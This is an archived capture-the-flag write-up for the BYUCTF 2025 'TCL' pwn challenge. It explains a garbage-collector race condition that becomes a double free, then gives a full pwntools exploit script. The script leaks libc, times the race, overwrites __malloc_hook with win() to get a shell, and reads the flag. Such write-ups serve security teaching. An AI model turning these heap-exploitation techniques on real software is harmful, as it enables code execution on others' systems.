@@ -1,0 +1,214 @@
+---
+title: "TCL — BYUCTF 2025"
+date: 2026-06-27
+author: "Imattas aka Zemi"
+slug: "byuctf-2025-tcl"
+order: 271
+writeupKind: "challenge"
+ctfSlug: "byuctf-2025"
+ctfTitle: "BYUCTF 2025"
+---
+
+# TCL — BYUCTF 2025
+
+> **Category:** `Binary Exploitation`  
+> **Author:** Imattas aka Zemi  
+> **Flag:** `byuctf{ok4y_y34h_th4t_d3fin1t3ly_suck3d}`  
+> **Source Path:** `pwn/tcl`
+
+---
+
+## Challenge Description
+
+```text
+I created my own Tiny Config Language and even a little parser for it - you should try it out!
+
+`nc tcl.chal.cyberjousting.com 1358`
+
+[tcl.zip]
+```
+
+---
+
+## Provided Materials
+
+- [Repository folder](https://github.com/BYU-CSA/BYUCTF-2025/tree/main/pwn/tcl)
+- [pwn/tcl/README.md](https://github.com/BYU-CSA/BYUCTF-2025/blob/main/pwn/tcl/README.md)
+- [pwn/tcl/tcl.zip](https://github.com/BYU-CSA/BYUCTF-2025/blob/main/pwn/tcl/tcl.zip)
+- [pwn/tcl/solve.py](https://github.com/BYU-CSA/BYUCTF-2025/blob/main/pwn/tcl/solve.py)
+
+---
+
+## Recon / Initial Analysis
+
+This page imports the BYUCTF 2025 source material for the Binary Exploitation challenge **TCL**. The prompt is kept separate from the solve notes, and upstream artifacts are linked so the challenge can be replayed from the original repository.
+
+---
+
+## Vulnerability / Observation
+
+The useful observation comes from the imported solve notes below. I kept the original technical path intact while normalizing the page metadata, challenge grouping, and author attribution for the Volume 2 writeup archive.
+
+---
+
+## Exploitation / Solution
+
+Source: [pwn/tcl/README.md](https://github.com/BYU-CSA/BYUCTF-2025/blob/main/pwn/tcl/README.md)
+
+The whole thing here is that there's a garbage collector that frees memory no longer used. It runs every 5 seconds and loops through the global variable of "objects" and frees anything not `NULL` with `refcount == 0` and sets it to `NULL`. One problem is a race condition - the program will let you use an object with refcount that's 0 as long as it's not `NULL`. The garbage collector runs through all global variables and makes a list of indexes. It then frees all the indexes in a row, then sets all them to `NULL`. However, there's a small section of time in between the freeing and setting to `NULL` where the attacker can reference that object (which was a freed chunk but is now reallocated) and change the `refcount`. Then, when the garbage collector sees `refcount` for the freed object is not 0, it will assume a mistake and not set it to NULL. This reallocated chunk will also be pushed onto the end of the objects array, leaving **two** references to same chunk in the objects array. 
+
+Once the second config file is finished, `clear_objects()` will set the `refcount` to 0 for both instances of the same chunk, and the garbage collector will end up freeing + setting both references to `NULL`. The race condition is having some line of the second config file allocate a chunk that just got freed but not yet set to `NULL`.
+
+The outline for the solution is as follows:
+- Create a config file with 50 objects (25x key/value string pairs)
+- Finish the config file
+- Start a second config file
+- Wait *x* amount of seconds (to time race condition) for the garbage collector thread to start to free the objects
+- Send a config line
+    - This will take the last freed chunk and use it, setting `refcount` to a non-0 value
+- When the garbage collector goes to nullify each freed chunk, it will run into the one allocated from the config line above and ignore it, leaving **two instances of the same chunk** in globals
+- Send more config lines to fill up all the `NULL`s in between the two references
+- Finish the config file
+- Wait at least 5 seconds for the garbage collector to do the double free
+- Start a third config file with a bunch of ints for the same key and have one of the ints end up overwriting the first instance with the GOT address of some function (to create a fake chunk there)
+- Send a bunch more lines with ints and have one of the float objects end up overwriting the fake chunk that got pushed on with the address for `win()` so you get a shell when it's called next
+
+Not at all complicated :)
+
+This is automated in `solve.py`, but the network jitter will have to be resolved with the random delay once it's actually deployed on the REAL infra.
+
+**Flag** - `byuctf{ok4y_y34h_th4t_d3fin1t3ly_suck3d}`
+
+---
+
+## Full Exploit Script
+
+Source: [pwn/tcl/solve.py](https://github.com/BYU-CSA/BYUCTF-2025/blob/main/pwn/tcl/solve.py)
+
+```python
+from pwn import *
+
+
+binary = "./tcl"
+elf = context.binary = ELF(binary, checksec=False)
+libc = ELF("./libc.so.6", checksec=False)
+
+gs = """
+continue
+"""
+
+
+"""
+Since this is a race condition with network jitter, there's a bit of brute force needed here.
+
+Note that I did actually get it to work on the actual infrastructure during playtesting so I KNOW ITS SOLVABLE.
+
+The `i` value was -16.
+"""
+for i in range(-50, 50):
+    if args.REMOTE:
+        p = remote("localhost", 5004)
+    elif args.REMOTE2:
+        p = remote("tcl.chal.cyberjousting.com", 1358)
+    elif args.GDB:
+        context.terminal = ["tmux", "splitw", "-h"]
+        p = gdb.debug(binary, gdbscript=gs)
+    else:
+        p = elf.process()
+
+
+
+    ### GET LEAK ###
+    alarm = int(p.recvline().strip(),16)
+    print(f"[+] alarm: {hex(alarm)}")
+    libc_base = alarm - libc.sym['alarm']
+    print(f"[+] libc_base: {hex(libc_base)}")
+
+
+
+    ### FIRST CONFIG ###
+    payload = b'#START\n'
+
+    """
+    I chose the same key for all the variables and a different integer for all the values so that
+    only one heap chunk is allocated for the string "legoclones" and all other chunks are allocated
+    for objects (increasing the likelihood that WHEN the race condition occurs, the chunk
+    given to the new object is also in the `global` list).
+    """
+    for _ in range(93):
+        payload += b'legoclones = '
+        payload += str(random.randint(0, 0xfffffff)).encode()
+        payload += b'\n'
+    payload += b'#END'
+
+    # print(payload)
+    p.sendline(payload)
+
+
+
+    ### SECOND CONFIG ###
+    p.sendline(b'#START\nlegoclones = 1336')                # set legoclones string NOW so only the 1337 later overlaps
+    if args.REMOTE or args.REMOTE2:
+        sleep(5.45 + (i * 0.01))
+    else: # simulate jitter
+        sleep(5.29 + 0.07)
+    p.sendline(b'legoclones = 1337')                        # exploit race condition (not set to NULL)
+
+    """
+    At this point, 0-5 should be taken up for some reason idk, and 4 other objects should be taken 
+    up (legoclones + number). This leaves 90 possible spaces in between that we need to fill.
+    """
+    sleep(3)
+    payload = b''
+    for _ in range(89):
+        payload += b'legoclones = '
+        payload += str(random.randint(0, 0xfffffff)).encode()
+        payload += b'\n'
+    payload += b'#END'
+    p.sendline(payload)
+
+    # wait for the garbage collector to do the double free
+    sleep(6)
+
+
+
+    ### EXPLOIT DOUBLE FREE ###
+    malloc_hook_addr = libc_base + libc.sym['__malloc_hook'] - 0x10
+    win_addr = elf.sym['win']
+    idx1 = 2
+    idx2 = 39
+
+    payload = b'#START\n'
+    for _ in range(41):
+        payload += b'legoclones = '
+        if _ == idx1:
+            payload += str(malloc_hook_addr).encode()
+        elif _ == idx2:
+            payload += str(win_addr).encode()
+        else:
+            payload += str(random.randint(0, 0xfffffff)).encode()
+        payload += b'\n'
+    # print(payload)
+    p.sendline(payload)
+
+    # clean up
+    p.recvuntil(b'Config is valid\n')
+    p.recvuntil(b'Config is valid\n')
+    print("[+] Shell?")
+
+    p.sendline(b'cat flag.txt')
+
+    out = p.recvall(timeout=1)
+    if b'Invalid line' not in out:
+        print(out)
+        p.interactive()
+    p.close()
+```
+
+---
+
+## Key Takeaways
+
+- The BYUCTF 2025 challenge material is preserved with local archive formatting.
+- The page author is normalized to Imattas aka Zemi.
+- The source repository remains linked for handouts, services, and solve artifacts.
